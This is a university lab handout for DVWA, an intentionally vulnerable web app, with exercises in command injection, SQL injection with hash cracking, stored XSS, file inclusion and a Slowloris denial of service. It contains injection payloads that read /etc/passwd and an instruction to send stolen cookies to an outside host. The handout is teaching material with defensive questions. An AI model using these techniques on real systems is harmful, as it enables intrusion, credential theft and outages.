# Lab 4
# Web application security

Fetch the latest version of assignment from the repository:

```
$ git pull
```

Login into the virtual machine and check the assigned IP addresses:
```
$ ip addr
...
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
...
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.19.0.136/24 brd 10.19.0.255 scope global dynamic noprefixroute enp0s8
...
4: enp0s9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.56.101/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s9
```

In this example, interfaces have the following IP addresses:

- NAT interface: 10.19.0.136, 
- Bridged interface: 10.0.2.15, 
- Host-only interface: 192.168.56.101.

"External IP addresses" of your virtual machine are the IP addresses assigned to "Bridged" and "Host-only" interfaces. 
Those two addresses of your virtual machine can be used to access the vulnerable web server from the host machine.

Start the pre-installed docker instance of the vulnerable web server:
```
$ sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

From your host machine (Windows) open the web interface of the "Vulnerable web server":

```
http://_external_address_/
```

Clik on the button: `Create / Reset Database` and then re-open the same page:
```
http://_external_address_/
```

Login credentials:
```
u: admin
p: password
```

This assignment is focused on web application vulnerabilities (Commmand
Execution, SQL injection, XSS and File inclusion). The aim of the assignment is
to exploit vulnerabilities in order to learn about web application testing and
protection.

**NOTE:** While performing the assingment you can find help by using the `View
Source` and `View Help` buttons in the bottom left corner of the displayed web
page.

## 1) Command Execution

- Open the `Command Execution` page.

- Enter the following data: `1 | echo sui`

- If you see the keyword `sui` below the input form continue with the
  assignment. If not, check the security level in the `DVWA Security` menu. It
  should be set to `low`.

- You can also execute any command after the initial `1 |`. Multiple commands
  can be executed withe the `&` symbol. e.g.: `1 | ls`, `1 | pwd & whoami & ps`

- You need to get the contents of the file `/etc/passwd` and include it in the
  final report with the command used to extract it.

## 2) SQL injection

- Open the `SQL Injection` page.

- Try out the basic examples from the literature.

- The aim is to get the password hash of the user named Pablo Picasso. To fetch the
  password you need to know the internal structure of the database and name of
  the table which contains user data. This data can be fetched by using SQL
  commands in the injection form. For easier solving, here is the format of
  the `users` table:
```
    mysql> show columns from users;
    +------------+-------------+------+-----+---------+-------+
    | Field      | Type        | Null | Key | Default | Extra |
    +------------+-------------+------+-----+---------+-------+
    | user_id    | int(6)      | NO   | PRI | 0       |       |
    | first_name | varchar(15) | YES  |     | NULL    |       |
    | last_name  | varchar(15) | YES  |     | NULL    |       |
    | user       | varchar(15) | YES  |     | NULL    |       |
    | password   | varchar(32) | YES  |     | NULL    |       |
    | avatar     | varchar(70) | YES  |     | NULL    |       |
    +------------+-------------+------+-----+---------+-------+
```

- The MD5 hash of the user Pablo Picasso should be saved to a file on the
  virtual machine. Example for the `admin` user password hash:
```
$ echo "21232f297a57a5a743894a0e4a801fc3" > hashes.txt
```

- The password is hashed using the MD5 algorithm. 

Password cracking using dictionary attack can be performed with `john` but 
the so called "Jumbo version of John the Ripper" is needed:
```
$ cd ~sui/sui-lab/zadatak4
$ git clone git://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john
```

Install pre-requisites::
```
$ sudo apt-get update
$ sudo apt-get install build-essential libssl-dev

$ cd john/src
$ ./configure
$ make -s clean && make -sj4
```

Start the dictionary attack with the just compiled `john` tool:
```
$ cd ~sui/sui-lab/zadatak4
$ john/run/john --format=raw-md5 hashes.txt           
Loaded 1 password hash (Raw MD5 [128/128 SSE2 intrinsics 12x])
admin            (?)
```

- You need to mention all the commands that you used to get the password hash
  for the Pablo Picasso user. The final solution is the password for the Pablo
  Picasso user.  (Hint: for querying the data, use the keyword `UNION`)

## 3) XSS (Cross Site Scripting)

- Open the `XSS Stored` page. Here you can input scripts in the `Message` form,
  which are then stored in the `guestbook` table in the database.

- Try to execute simple javascript code. The script should load when the page is
  refreshed. (e.g. javascript command `alert()`)

- The aim is to readout the Cookie for the current user with the `alert()`
  command. The value of the variable `PHPSESSID` needs to be menitoned in the
  report in a single line in the following format:
```
PHPSESSID=f04m0i20nek10volimtep6e9irji5
```
    
- All cookies need to be sent by using the `GET` request as a parameter to the page 
  `http://public.tel.fer.hr/sui`. (e.g.
  `http://public.tel.fer.hr/sui?cookie=security=low;%20PHPSESSID=f04m0i20nek10volimtep6e9irji5`).
  Describe the whole procedure and provide scripts used.
    
- How would you protect an application from this type of vulnerability?

## 4) File inclusion

- Open the File Inclusion page and follow the instructions (you can change the
  HTTP `GET` `page` parameter)

- Output the `/etc/passwd/` file and add a screenshot of the screen with the
  data. Why can this be executed?

- How would you protect an application from this type of vulnerability?

## 5) Denial of Service attack

- This assignment is not performed on the DVWA web interface, but in the console
  of the virtual machine.

- In the `zadatak4` directory you have the `slowloris.pl` script.

- Start the script in order to prevent outside access to the web server. The
  script can be started on the localhost:
```
$ ./slowloris.pl -dns localhost
```

- How much time is needed to mount the attack? Describe how the slowloris tool
  works. (`http://ha.ckers.org/slowloris/`)

## Assignment results

You **need to send** the following data by email to
[sui@fer.hr](mailto:sui@fer.hr) after solving the assignment: 

- **report** on the subject in **PDF format** (should not exceed **1000 words**)
  which contains the procedure that you used to solve the assigment along with
  answers to assignment questions

## Tools for this assignment

- `john` - tool for cracking weak passwords.
- `slowloris` - tool for attacking apache http server.
